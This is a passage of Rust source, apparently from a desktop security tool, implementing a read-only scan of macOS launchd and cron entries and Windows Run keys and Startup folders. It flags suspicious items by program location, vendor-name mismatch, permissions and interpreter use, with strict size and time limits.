//! `--list-startup`: what starts by itself on this computer, each item judged with the same
//! read-only inspection as `--check-file`. Nothing is moved, switched off, stopped, recorded
//! or sent. Every definition file (a launchd plist, a registry value, a crontab line, a
//! shortcut) is written by someone else and is hostile input: it is opened without following
//! links, never waited on (pipes), read up to a size limit, parsed by `plutil` with no shell,
//! and every item and the whole run have time limits. It runs in a child process of the app.

use crate::ai_policy;
use crate::bin_ai::BinaryAiScanner;
use crate::check_file::{self, Verdict as FileVerdict};
use crate::config::AppConfig;
use crate::engine::{self, FileKind};
use crate::platform;
use crate::process_guard;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{mpsc, Arc};
use std::time::{Duration, Instant};

pub const MAX_ITEMS: usize = 500;
/// A launch definition is a few hundred bytes; this is far beyond any real one.
pub const MAX_DEFINITION_BYTES: u64 = 1024 * 1024;
const MAX_DIR_ENTRIES: usize = 2000;
const MAX_ARGS: usize = 16;
const MAX_TEXT: usize = 300;
const MAX_REASONS: usize = 8;
const MAX_UNREADABLE: usize = 100;
const ITEM_LIMIT: Duration = Duration::from_secs(20);
pub const TOTAL_LIMIT: Duration = Duration::from_secs(90);

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Suspicious,
    WorthALook,
    NothingFound,
    /// The program could not be located or inspected, so no opinion is given.
    NotChecked,
}

impl Verdict {
    fn rank(self) -> u8 {
        self as u8
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct StartupItem {
    pub name: String,
    /// "launch_daemon", "launch_agent", "cron", "run_key", "run_once_key" or "startup_folder".
    pub kind: String,
    /// The file or registry key that sets it up.
    pub location: String,
    pub program: Option<String>,
    pub arguments: Vec<String>,
    /// The script an interpreter (shell, Python, PowerShell...) is told to run.
    pub script: Option<String>,
    /// Only when the definition says: false when it is switched off, true when it starts itself.
    pub enabled: Option<bool>,
    pub exists: bool,
    pub trusted: bool,
    pub verdict: Verdict,
    pub score: Option<f32>,
    /// Plain-language sentences, strongest first.
    pub reasons: Vec<String>,
    /// The exact program is on the always-allow list.
    pub allowed: bool,
    /// "you", "system", "every user" or another user's name.
    pub runs_as: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Unreadable {
    pub place: String,
    pub reason: String,
}

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct StartupReport {
    /// Suspicious first.
    pub items: Vec<StartupItem>,
    pub unreadable: Vec<Unreadable>,
    /// Items left out because they belong to the operating system itself.
    pub skipped: u32,
    /// More than `MAX_ITEMS` were found; the rest are not listed.
    pub truncated: bool,
}

fn clean(text: &str, max: usize) -> String {
    text.chars()
        .take(max)
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect()
}

impl StartupReport {
    /// Cuts every field to its limit, so a report is small whatever the files said.
    pub fn clamp(&mut self) {
        self.truncated |= self.items.len() > MAX_ITEMS;
        self.items.truncate(MAX_ITEMS);
        self.unreadable.truncate(MAX_UNREADABLE);
        for item in &mut self.items {
            for text in [&mut item.name, &mut item.kind, &mut item.runs_as] {
                *text = clean(text, MAX_TEXT);
            }
            item.location = clean(&item.location, 2 * MAX_TEXT);
            for text in item.program.iter_mut().chain(item.script.iter_mut()) {
                *text = clean(text, 2 * MAX_TEXT);
            }
            item.arguments.truncate(MAX_ARGS);
            for arg in &mut item.arguments {
                *arg = clean(arg, MAX_TEXT);
            }
            item.reasons.truncate(MAX_REASONS);
            for reason in &mut item.reasons {
                *reason = clean(reason, 2 * MAX_TEXT);
            }
        }
        for place in &mut self.unreadable {
            place.place = clean(&place.place, 2 * MAX_TEXT);
            place.reason = clean(&place.reason, 2 * MAX_TEXT);
        }
    }
}

/// One definition as read from its file, before anyone has looked at the program.
#[derive(Debug, Clone, Default)]
pub struct Candidate {
    pub name: String,
    pub kind: &'static str,
    pub location: String,
    pub program: Option<String>,
    pub arguments: Vec<String>,
    pub enabled: Option<bool>,
    pub runs_as: String,
    /// Findings about the definition itself, already worded (for example "others can change it").
    pub notes: Vec<String>,
    /// Why no program path is known (a shortcut, a path inside an app bundle).
    pub unresolved: Option<String>,
    /// A line a shell will run (cron): the command-line rules are applied to all of it.
    pub shell_command: Option<String>,
}

struct Found {
    candidates: Vec<Candidate>,
    unreadable: Vec<Unreadable>,
    truncated: bool,
    max_items: usize,
}

impl Found {
    fn push(&mut self, candidate: Candidate) {
        if self.candidates.len() < self.max_items {
            self.candidates.push(candidate);
        } else {
            self.truncated = true;
        }
    }

    fn unreadable(&mut self, place: impl Into<String>, reason: impl Into<String>) {
        if self.unreadable.len() < MAX_UNREADABLE {
            self.unreadable.push(Unreadable {
                place: place.into(),
                reason: reason.into(),
            });
        }
    }
}

// ---- Pure helpers (tested on every OS) ----

/// Where a program lives when that is worth a mention: "temp", "downloads" or "hidden".
pub fn risky_location(path: &str) -> Option<&'static str> {
    let norm = path.replace('\\', "/").to_lowercase();
    let parts: Vec<&str> = norm.split('/').filter(|p| !p.is_empty()).collect();
    let temp_roots = [
        "/tmp/",
        "/private/tmp/",
        "/var/tmp/",
        "/private/var/tmp/",
        "/var/folders/",
        "/private/var/folders/",
    ];
    if temp_roots.iter().any(|root| norm.starts_with(root))
        || parts.iter().any(|p| matches!(*p, "temp" | "tmp"))
    {
        Some("temp")
    } else if parts.contains(&"downloads") {
        Some("downloads")
    } else if parts.iter().any(|p| p.starts_with('.') && *p != "..") {
        Some("hidden")
    } else {
        None
    }
}

/// Whose name an item borrows: Apple's reverse-domain labels, or anything with "Microsoft".
pub fn claimed_vendor(name: &str) -> Option<&'static str> {
    let n = name.trim().to_lowercase();
    if n.starts_with("com.apple.") || n.starts_with("apple ") {
        Some("Apple")
    } else if n.contains("microsoft") || n.starts_with("windows ") {
        Some("Microsoft")
    } else {
        None
    }
}

/// The lower-case file name of a program, without ".exe".
fn program_stem(program: &str) -> String {
    let name = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let lower = name.to_lowercase();
    lower.strip_suffix(".exe").unwrap_or(&lower).to_string()
}

/// Programs that run a script or a command given to them: trusting the program says nothing
/// about what it is told to run.
pub fn is_interpreter(stem: &str) -> bool {
    stem.starts_with("python")
        || matches!(
            stem,
            "sh" | "bash"
                | "zsh"
                | "dash"
                | "ksh"
                | "csh"
                | "tcsh"
                | "fish"
                | "env"
                | "perl"
                | "ruby"
                | "php"
                | "node"
                | "osascript"
                | "lua"
                | "powershell"
                | "pwsh"
                | "cmd"
                | "wscript"
                | "cscript"
                | "mshta"
        )
}

/// What an interpreter is told to run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Target {
    /// The command is written on the command line itself.
    Inline,
    Script(String),
    Nothing,
}

/// Looks through the arguments after an interpreter for its script. `env python3 x.py` is
/// followed to `python3`. Returns the interpreter that really runs and what it runs.
pub fn script_target(stem: &str, args: &[String]) -> (String, Target) {
    let mut stem = stem.to_string();
    let mut args = args;
    if stem == "env" {
        let skip = args
            .iter()
            .take_while(|a| a.starts_with('-') || a.contains('='))
            .count();
        let Some(real) = args.get(skip) else {
            return (stem, Target::Nothing);
        };
        stem = program_stem(real);
        args = &args[skip + 1..];
    }
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let lower = arg.to_lowercase();
        match lower.as_str() {
            "-c" | "-e" | "/c" | "/k" | "-command" | "-encodedcommand" | "-enc" | "-ec"
            | "--eval" | "-r" => return (stem, Target::Inline),
            "-file" | "-f" => {
                return (
                    stem,
                    iter.next()
                        .map_or(Target::Nothing, |s| Target::Script(s.clone())),
                )
            }
            _ if lower.starts_with('-') || lower.starts_with('/') && lower.len() <= 3 => {}
            _ => return (stem, Target::Script(arg.clone())),
        }
    }
    (stem, Target::Nothing)
}

/// Splits what follows a program the way Windows does: spaces separate, double quotes group.
pub fn split_arguments(text: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut started = false;
    let mut quoted = false;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\\' if chars.peek() == Some(&'"') => {
                current.push('"');
                chars.next();
                started = true;
            }
            '"' => {
                quoted = !quoted;
                started = true;
            }
            c if c.is_whitespace() && !quoted => {
                if started {
                    args.push(std::mem::take(&mut current));
                    started = false;
                }
            }
            c => {
                current.push(c);
                started = true;
            }
        }
        if args.len() > MAX_ARGS * 4 {
            break;
        }
    }
    if started {
        args.push(current);
    }
    args
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedCommand {
    pub program: String,
    pub arguments: Vec<String>,
    /// The program path has spaces and was not in quotes: Windows may start a different file.
    pub unquoted_spaces: bool,
}

/// A Windows command line (a Run value, a service path) as program and arguments. A quoted
/// path ends at the closing quote. An unquoted one is ambiguous (`C:\Program Files\A\a.exe -x`),
/// so, like Windows, the shortest prefix that names an existing file wins; with none, the first
/// word is taken. `exists` is the file check, passed in so this stays pure.
pub fn parse_command_line(text: &str, exists: &dyn Fn(&str) -> bool) -> ParsedCommand {
    let text = text.trim();
    if let Some(rest) = text.strip_prefix('"') {
        let (program, tail) = rest.split_once('"').unwrap_or((rest, ""));
        return ParsedCommand {
            program: program.trim().to_string(),
            arguments: split_arguments(tail),
            unquoted_spaces: false,
        };
    }
    let boundaries = text
        .char_indices()
        .filter(|(_, c)| c.is_whitespace())
        .map(|(i, _)| i)
        .take(64);
    for end in boundaries.chain(std::iter::once(text.len())) {
        let candidate = text[..end].trim_end();
        if !candidate.is_empty() && exists(candidate) {
            return ParsedCommand {
                program: candidate.to_string(),
                arguments: split_arguments(&text[end..]),
                unquoted_spaces: candidate.contains(char::is_whitespace),
            };
        }
    }
    let end = text.find(char::is_whitespace).unwrap_or(text.len());
    ParsedCommand {
        program: text[..end].to_string(),
        arguments: split_arguments(&text[end..]),
        unquoted_spaces: false,
    }
}

/// `%NAME%` replaced from `lookup`; unknown names are left as they are.
pub fn expand_env(text: &str, lookup: &dyn Fn(&str) -> Option<String>) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(start) = rest.find('%') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        match after.find('%') {
            Some(len) if len > 0 && lookup(&after[..len]).is_some() => {
                out.push_str(&lookup(&after[..len]).unwrap_or_default());
                rest = &after[len + 1..];
            }
            _ => {
                out.push('%');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Jobs in a crontab as (schedule, command). Comments, blank lines and `NAME=value` lines are
/// not jobs.
pub fn parse_crontab(text: &str) -> Vec<(String, String)> {
    let mut jobs = Vec::new();
    for line in text.lines().map(str::trim) {
        if line.is_empty() || line.starts_with('#') || jobs.len() >= MAX_ITEMS {
            continue;
        }
        let fields: Vec<&str> = line.split_whitespace().collect();
        let (schedule, command) = if fields[0].starts_with('@') {
            (fields[0].to_string(), fields[1..].join(" "))
        } else if fields.len() > 5 {
            (fields[..5].join(" "), fields[5..].join(" "))
        } else {
            continue; // an environment line (NAME=value) or a broken one
        };
        if !command.is_empty() {
            jobs.push((schedule, command));
        }
    }
    jobs
}

fn digest_of(hex: &str) -> Option<[u8; 32]> {
    if hex.len() != 64 || !hex.is_ascii() {
        return None;
    }
    let mut digest = [0u8; 32];
    for (byte, pair) in digest.iter_mut().zip(hex.as_bytes().chunks(2)) {
        *byte = u8::from_str_radix(std::str::from_utf8(pair).ok()?, 16).ok()?;
    }
    Some(digest)
}

/// Writable by everyone, or (for a root-owned file) by a group beyond wheel and admin, who can
/// become root anyway.
#[cfg(unix)]
fn loose_permissions(meta: &fs::Metadata) -> bool {
    use std::os::unix::fs::MetadataExt;
    let mode = meta.mode();
    mode & 0o002 != 0 || (meta.uid() == 0 && mode & 0o020 != 0 && !matches!(meta.gid(), 0 | 80))
}

#[cfg(not(unix))]
fn loose_permissions(_meta: &fs::Metadata) -> bool {
    false
}

// ---- Judging one item ----

fn plain_item(c: &Candidate, verdict: Verdict, reasons: Vec<String>) -> StartupItem {
    StartupItem {
        name: c.name.clone(),
        kind: c.kind.to_string(),
        location: c.location.clone(),
        program: c.program.clone(),
        arguments: c.arguments.clone(),
        script: None,
        enabled: c.enabled,
        exists: false,
        trusted: false,
        verdict,
        score: None,
        reasons,
        allowed: false,
        runs_as: c.runs_as.clone(),
    }
}

fn location_reason(kind: &str, what: &str) -> String {
    match kind {
        "temp" => format!(
            "It starts {what} from a temporary folder, where programs do not normally live."
        ),
        "downloads" => format!(
            "It starts {what} from a Downloads folder, where programs do not normally live."
        ),
        _ => format!("It starts {what} from a hidden folder."),
    }
}

/// Whether the program really comes from the vendor its name claims.
fn vendor_confirmed(vendor: &str, path: &Path, trusted: bool) -> bool {
    match vendor {
        // Anyone with a Developer ID is "trusted"; only Apple itself may use an Apple name.
        "Apple" => {
            trusted && (platform::is_os_vendor_signed(path) || ai_policy::is_os_critical_path(path))
        }
        _ => trusted,
    }
}

enum Judged {
    Item(StartupItem),
    /// Belongs to the operating system: left out.
    Skipped,
}

fn judge(cfg: &AppConfig, scanner: &BinaryAiScanner, c: Candidate) -> Judged {
    // strong: makes it "Suspicious"; soft: "Worth a look"; info: said, but changes nothing.
    let mut strong: Vec<String> = Vec::new();
    let mut soft: Vec<String> = c.notes.clone();
    let mut info: Vec<String> = c.unresolved.iter().cloned().collect();
    let mut item = plain_item(&c, Verdict::NotChecked, Vec::new());
    let Some(program) = c.program.as_deref() else {
        item.verdict = if soft.is_empty() {
            Verdict::NotChecked
        } else {
            Verdict::WorthALook
        };
        soft.extend(info);
        item.reasons = soft;
        return Judged::Item(item);
    };
    let path = Path::new(program);
    let Ok(meta) = fs::metadata(path) else {
        soft.push(format!(
            "The program it starts is not there ({}). This usually means the software was removed and left this entry behind.",
            clean(program, 120)
        ));
        item.verdict = Verdict::WorthALook;
        soft.extend(info);
        item.reasons = soft;
        return Judged::Item(item);
    };
    item.exists = true;
    item.trusted = scanner.is_trusted(path);
    let stem = program_stem(program);
    let name_claims = claimed_vendor(&c.name);
    if let Some(vendor) = name_claims {
        if vendor_confirmed(vendor, path, item.trusted) {
            if vendor == "Apple" && cfg!(target_os = "macos") {
                return Judged::Skipped;
            }
        } else {
            strong.push(format!(
                "Its name says it comes from {vendor}, but the program is not signed by {vendor}."
            ));
        }
    }
    if let Some(place) = risky_location(program) {
        soft.push(location_reason(place, "a program"));
    }
    if loose_permissions(&meta) {
        soft.push("Other users on this computer can change the program it starts.".into());
    }

    // What actually runs: the interpreter's script, or the program itself.
    let mut command_name = stem.clone();
    let mut command_line = std::iter::once(program.to_string())
        .chain(c.arguments.iter().cloned())
        .collect::<Vec<_>>()
        .join(" ");
    if let Some(shell) = &c.shell_command {
        command_name = "sh".into();
        command_line = shell.clone();
    }
    let mut judged_file: Option<PathBuf> = Some(path.to_path_buf());
    if is_interpreter(&stem) {
        let (real, target) = script_target(&stem, &c.arguments);
        command_name = real;
        match target {
            Target::Script(script) if Path::new(&script).is_absolute() => {
                item.script = Some(script.clone());
                let script_path = PathBuf::from(&script);
                judged_file = None;
                match fs::metadata(&script_path) {
                    Err(_) => soft.push(format!(
                        "The script it runs is not there ({}).",
                        clean(&script, 120)
                    )),
                    Ok(script_meta) => {
                        if let Some(place) = risky_location(&script) {
                            soft.push(location_reason(place, "a script"));
                        }
                        if loose_permissions(&script_meta) {
                            soft.push(
                                "Other users on this computer can change the script it runs."
                                    .into(),
                            );
                        }
                        // Only the known-malware list applies to a script.
                        let r = check_file::check(cfg, scanner, &script_path);
                        if r.verdict == FileVerdict::Suspicious {
                            strong.extend(r.reasons);
                        }
                    }
                }
                if item.trusted {
                    info.push(format!(
                        "It runs a script with {stem}, a tool this computer trusts. That does not make the script trusted."
                    ));
                }
            }
            Target::Script(script) => item.script = Some(script),
            _ => {}
        }
    }
    if let Some(pattern) = process_guard::check_lotl_command(&command_name, &command_line) {
        strong.push(format!(
            "The command it runs looks like one malware uses to hide or fetch things (matched \"{pattern}\")."
        ));
    }

    if let Some(file) = judged_file {
        let r = check_file::check(cfg, scanner, &file);
        item.score = r.score;
        item.allowed = r
            .sha256
            .as_deref()
            .and_then(digest_of)
            .is_some_and(|d| cfg.is_allowed(&d));
        match r.verdict {
            FileVerdict::Suspicious if item.allowed => {
                info.push(
                    "You told The Nex to always allow this exact file, so it is not flagged."
                        .into(),
                );
            }
            FileVerdict::Suspicious => strong.extend(r.reasons),
            FileVerdict::Refused => soft.extend(r.reasons),
            _ => {}
        }
        if !item.trusted && engine::classify_file(&file) == FileKind::Binary {
            soft.push("It is not signed by a publisher this computer trusts, so its maker cannot be confirmed.".into());
        }
    }
    item.verdict = if !strong.is_empty() {
        Verdict::Suspicious
    } else if !soft.is_empty() {
        Verdict::WorthALook
    } else {
        Verdict::NothingFound
    };
    strong.extend(soft);
    strong.extend(info);
    item.reasons = strong;
    Judged::Item(item)
}

/// `judge` on its own thread, abandoned if it takes too long (a signature check or a hash of a
/// huge file can stall); the abandoned thread only reads and ends with the process.
fn judge_timed(
    cfg: &Arc<AppConfig>,
    scanner: &Arc<BinaryAiScanner>,
    c: &Candidate,
    limit: Duration,
) -> Judged {
    let (sender, receiver) = mpsc::channel();
    let (cfg, scanner, owned) = (Arc::clone(cfg), Arc::clone(scanner), c.clone());
    let spawned = std::thread::Builder::new()
        .name("thenex-startup-item".into())
        .spawn(move || {
            let _ = sender.send(judge(&cfg, &scanner, owned));
        });
    let outcome = match spawned {
        Ok(_) => receiver.recv_timeout(limit).ok(),
        Err(_) => None,
    };
    outcome.unwrap_or_else(|| {
        Judged::Item(plain_item(
            c,
            Verdict::NotChecked,
            vec!["Checking this one took too long, so it was stopped. Nothing was changed.".into()],
        ))
    })
}

#[derive(Debug, Clone, Copy)]
pub struct Limits {
    pub max_items: usize,
    pub per_item: Duration,
    pub total: Duration,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_items: MAX_ITEMS,
            per_item: ITEM_LIMIT,
            total: TOTAL_LIMIT,
        }
    }
}

/// Reads every startup place and judges each item. `startup_dir` (testing only) replaces every
/// place with that one folder.
pub fn list(
    cfg: &Arc<AppConfig>,
    scanner: &Arc<BinaryAiScanner>,
    startup_dir: Option<&Path>,
    limits: Limits,
) -> StartupReport {
    let deadline = Instant::now() + limits.total;
    let mut found = Found {
        candidates: Vec::new(),
        unreadable: Vec::new(),
        truncated: false,
        max_items: limits.max_items,
    };
    collect(&mut found, startup_dir);
    let mut report = StartupReport {
        truncated: found.truncated,
        unreadable: found.unreadable,
        ..StartupReport::default()
    };
    for candidate in &found.candidates {
        let judged = if Instant::now() >= deadline {
            Judged::Item(plain_item(
                candidate,
                Verdict::NotChecked,
                vec!["There was not enough time to check this one. Run the check again.".into()],
            ))
        } else {
            judge_timed(
                cfg,
                scanner,
                candidate,
                limits.per_item.min(deadline - Instant::now()),
            )
        };
        match judged {
            Judged::Item(item) => report.items.push(item),
            Judged::Skipped => report.skipped += 1,
        }
    }
    report
        .items
        .sort_by_cached_key(|i| (i.verdict.rank(), i.name.to_lowercase()));
    report.clamp();
    report
}

// ---- macOS: launchd and cron ----

#[cfg(target_os = "macos")]
use self::launchd::collect;

#[cfg(target_os = "macos")]
mod launchd {
    use super::*;
    use std::io::Read;
    use std::process::{Command, Stdio};

    const PLUTIL: &str = "/usr/bin/plutil";
    const CRONTAB: &str = "/usr/bin/crontab";
    const TOOL_LIMIT: Duration = Duration::from_secs(5);
    const MAX_TOOL_OUTPUT: u64 = 2 * 1024 * 1024;
    /// Where launchd looks for a program given without a folder.
    const DEFAULT_PATH: [&str; 4] = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];

    /// Runs a system tool with no shell, bytes on stdin, a time limit and bounded output.
    /// None when it could not be started or ran too long.
    fn run_limited(program: &str, args: &[&str], input: &[u8]) -> Option<(bool, Vec<u8>)> {
        let mut child = Command::new(program)
            .args(args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .ok()?;
        let mut stdin = child.stdin.take()?;
        let stdout = child.stdout.take()?;
        let data = input.to_vec();
        std::thread::spawn(move || {
            let _ = std::io::Write::write_all(&mut stdin, &data);
        });
        let (sender, receiver) = mpsc::channel();
        std::thread::spawn(move || {
            let mut out = Vec::new();
            let _ = stdout.take(MAX_TOOL_OUTPUT).read_to_end(&mut out);
            let _ = sender.send(out);
        });
        let deadline = Instant::now() + TOOL_LIMIT;
        let ok = loop {
            match child.try_wait() {
                Ok(Some(status)) => break Some(status.success()),
                Ok(None) if Instant::now() < deadline => {
                    std::thread::sleep(Duration::from_millis(10))
                }
                _ => break None,
            }
        };
        if ok.is_none() {
            let _ = child.kill();
            let _ = child.wait();
        }
        let out = receiver.recv_timeout(Duration::from_secs(2)).ok()?;
        ok.map(|ok| (ok, out))
    }

    /// The bytes of a definition and whether other users can change it. Links are followed once
    /// to a real file and nothing else is opened: no pipe, device or folder, and no waiting.
    fn read_definition(path: &Path) -> Result<(Vec<u8>, bool), String> {
        let target = fs::canonicalize(path)
            .map_err(|_| "It is a link that leads nowhere, so it was not opened.".to_string())?;
        let file = crate::quarantine::open_nofollow(&target).map_err(|e| {
            if e.kind() == std::io::ErrorKind::InvalidInput {
                "It is not an ordinary file (it is a folder, pipe or device), so it was not opened."
                    .to_string()
            } else {
                "It could not be opened. You may not have permission.".to_string()
            }
        })?;
        let meta = file
            .metadata()
            .map_err(|_| "It could not be read.".to_string())?;
        if meta.len() > MAX_DEFINITION_BYTES {
            return Err(
                "It is far larger than any real startup file, so it was not opened.".into(),
            );
        }
        let mut bytes = Vec::new();
        file.take(MAX_DEFINITION_BYTES + 1)
            .read_to_end(&mut bytes)
            .map_err(|_| "It could not be read.".to_string())?;
        if bytes.len() as u64 > MAX_DEFINITION_BYTES {
            return Err(
                "It is far larger than any real startup file, so it was not opened.".into(),
            );
        }
        Ok((bytes, loose_permissions(&meta)))
    }

    fn plist_to_json(bytes: &[u8]) -> Result<serde_json::Value, String> {
        let broken = || {
            "It is damaged or is not a valid startup definition, so it could not be read."
                .to_string()
        };
        let (ok, out) = run_limited(PLUTIL, &["-convert", "json", "-o", "-", "-"], bytes)
            .ok_or_else(|| {
                "It could not be read: the system's property-list reader did not answer."
                    .to_string()
            })?;
        if !ok {
            return Err(broken());
        }
        serde_json::from_slice(&out).map_err(|_| broken())
    }

    fn strings(value: Option<&serde_json::Value>) -> Vec<String> {
        value
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|s| s.as_str())
                    .take(MAX_ARGS * 4)
                    .map(|s| clean(s, MAX_TEXT))
                    .collect()
            })
            .unwrap_or_default()
    }

    fn candidate(
        json: &serde_json::Value,
        path: &Path,
        kind: &'static str,
        loose: bool,
    ) -> Result<Candidate, String> {
        let dict = json
            .as_object()
            .ok_or("It is not a startup definition (it holds no list of settings).")?;
        let text = |key: &str| {
            dict.get(key)
                .and_then(|v| v.as_str())
                .map(|s| clean(s, 2 * MAX_TEXT))
        };
        let mut argv = strings(dict.get("ProgramArguments"));
        let mut c = Candidate {
            name: text("Label")
                .or_else(|| {
                    path.file_stem()
                        .map(|s| clean(&s.to_string_lossy(), MAX_TEXT))
                })
                .unwrap_or_default(),
            kind,
            location: path.display().to_string(),
            runs_as: "you".into(),
            ..Candidate::default()
        };
        if kind == "launch_daemon" {
            c.runs_as = match text("UserName").as_deref() {
                None | Some("root") | Some("") => "system".into(),
                Some(user) => user.to_string(),
            };
        }
        let program = text("Program").or_else(|| (!argv.is_empty()).then(|| argv[0].clone()));
        if !argv.is_empty() {
            argv.remove(0);
        }
        c.arguments = argv;
        c.program = program.map(|p| {
            // launchd searches a fixed PATH for a bare name.
            if p.contains('/') {
                p
            } else {
                DEFAULT_PATH
                    .iter()
                    .map(|dir| format!("{dir}/{p}"))
                    .find(|full| Path::new(full).exists())
                    .unwrap_or(p)
            }
        });
        if c.program.is_none() {
            c.unresolved = Some(match text("BundleProgram") {
                Some(inside) => format!(
                    "It starts a program inside an app (\"{}\"), and which app that is was not found, so the program was not checked.",
                    clean(&inside, 100)
                ),
                None => "It does not name a program to start, so there is nothing to check.".into(),
            });
        }
        c.enabled = if dict.get("Disabled").and_then(|v| v.as_bool()) == Some(true) {
            Some(false)
        } else if dict.get("RunAtLoad").and_then(|v| v.as_bool()) == Some(true)
            || dict.contains_key("KeepAlive")
        {
            Some(true)
        } else {
            None
        };
        if loose {
            c.notes
                .push("Other users on this computer can change this startup file.".into());
        }
        Ok(c)
    }

    fn scan_dir(found: &mut Found, dir: &Path, kind: &'static str) {
        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(_) => {
                found.unreadable(
                    dir.display().to_string(),
                    "This folder could not be opened. You may not have permission.",
                );
                return;
            }
        };
        let mut files: Vec<PathBuf> = entries
            .flatten()
            .take(MAX_DIR_ENTRIES)
            .map(|e| e.path())
            .filter(|p| {
                p.extension()
                    .is_some_and(|e| e.eq_ignore_ascii_case("plist"))
            })
            .collect();
        files.sort();
        for path in files {
            let read = read_definition(&path)
                .and_then(|(bytes, loose)| Ok((plist_to_json(&bytes)?, loose)))
                .and_then(|(json, loose)| candidate(&json, &path, kind, loose));
            match read {
                Ok(c) => found.push(c),
                Err(why) => found.unreadable(path.display().to_string(), why),
            }
        }
    }

    fn scan_cron(found: &mut Found) {
        let Some((ok, out)) = run_limited(CRONTAB, &["-l"], b"") else {
            found.unreadable("Your scheduled jobs (crontab)", "They could not be listed.");
            return;
        };
        if !ok {
            return; // "no crontab for this user" is the normal answer
        }
        for (schedule, command) in parse_crontab(&String::from_utf8_lossy(&out)) {
            let words: Vec<&str> = command.split_whitespace().collect();
            let first = words.first().copied().unwrap_or_default();
            let program = first.starts_with('/').then(|| clean(first, 2 * MAX_TEXT));
            found.push(Candidate {
                name: clean(&program_stem(first), MAX_TEXT),
                kind: "cron",
                location: format!("Your scheduled jobs (crontab), {}", clean(&schedule, 60)),
                unresolved: program.is_none().then(|| {
                    "It runs a shell command, so the program was not located.".to_string()
                }),
                program,
                arguments: words
                    .iter()
                    .skip(1)
                    .take(MAX_ARGS)
                    .map(|w| clean(w, MAX_TEXT))
                    .collect(),
                enabled: Some(true),
                runs_as: "you".into(),
                shell_command: Some(clean(&command, 4 * MAX_TEXT)),
                ..Candidate::default()
            });
        }
    }

    pub(super) fn collect(found: &mut Found, startup_dir: Option<&Path>) {
        if let Some(dir) = startup_dir {
            return scan_dir(found, dir, "launch_agent");
        }
        scan_dir(found, Path::new("/Library/LaunchDaemons"), "launch_daemon");
        scan_dir(found, Path::new("/Library/LaunchAgents"), "launch_agent");
        match std::env::var_os("HOME")
            .map(PathBuf::from)
            .filter(|h| h.is_absolute())
        {
            Some(home) => scan_dir(found, &home.join("Library/LaunchAgents"), "launch_agent"),
            None => found.unreadable(
                "Your LaunchAgents folder",
                "Your home folder could not be found.",
            ),
        }
        scan_cron(found);
        found.unreadable(
            "Login Items and background items",
            "macOS keeps this list in a protected database that apps cannot read. To see it, open System Settings > General > Login Items.",
        );
    }
}

// ---- Windows: Run keys and Startup folders ----

#[cfg(windows)]
use self::registry::collect;

#[cfg(windows)]
mod registry {
    use super::*;

    const RUN: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    const RUN_ONCE: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
    const RUN_32: &str = r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run";
    const RUN_ONCE_32: &str = r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce";

    fn from_command(
        name: &str,
        kind: &'static str,
        location: String,
        command: &str,
        runs_as: &str,
    ) -> Candidate {
        let expanded = expand_env(command, &|var| std::env::var(var).ok());
        let parsed = parse_command_line(&expanded, &|p| Path::new(p).is_file());
        let mut c = Candidate {
            name: clean(name, MAX_TEXT),
            kind,
            location,
            program: (!parsed.program.is_empty()).then(|| clean(&parsed.program, 2 * MAX_TEXT)),
            arguments: parsed
                .arguments
                .iter()
                .take(MAX_ARGS)
                .map(|a| clean(a, MAX_TEXT))
                .collect(),
            enabled: Some(true),
            runs_as: runs_as.into(),
            ..Candidate::default()
        };
        if parsed.unquoted_spaces {
            c.notes.push("Its path has spaces but no quotation marks around it, which Windows can misread and so start a different file.".into());
        }
        c
    }

    fn scan_key(found: &mut Found, machine: bool, subkey: &str, kind: &'static str) {
        let hive = if machine { "HKLM" } else { "HKCU" };
        let location = format!(r"{hive}\{subkey}");
        match platform::read_registry_strings(machine, subkey) {
            Ok(values) => {
                let runs_as = if machine { "every user" } else { "you" };
                for (name, command) in values {
                    found.push(from_command(
                        &name,
                        kind,
                        location.clone(),
                        &command,
                        runs_as,
                    ));
                }
            }
            Err(why) => found.unreadable(location, why),
        }
    }

    fn scan_startup_folder(found: &mut Found, dir: &Path, runs_as: &str) {
        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(_) => {
                found.unreadable(
                    dir.display().to_string(),
                    "This folder could not be opened. You may not have permission.",
                );
                return;
            }
        };
        let mut files: Vec<PathBuf> = entries
            .flatten()
            .take(MAX_DIR_ENTRIES)
            .map(|e| e.path())
            .collect();
        files.sort();
        for path in files {
            let Some(file_name) = path.file_name().map(|n| n.to_string_lossy().to_string()) else {
                continue;
            };
            if file_name.eq_ignore_ascii_case("desktop.ini") {
                continue;
            }
            let mut c = Candidate {
                name: clean(
                    &path
                        .file_stem()
                        .map(|s| s.to_string_lossy().to_string())
                        .unwrap_or_default(),
                    MAX_TEXT,
                ),
                kind: "startup_folder",
                location: path.display().to_string(),
                enabled: Some(true),
                runs_as: runs_as.into(),
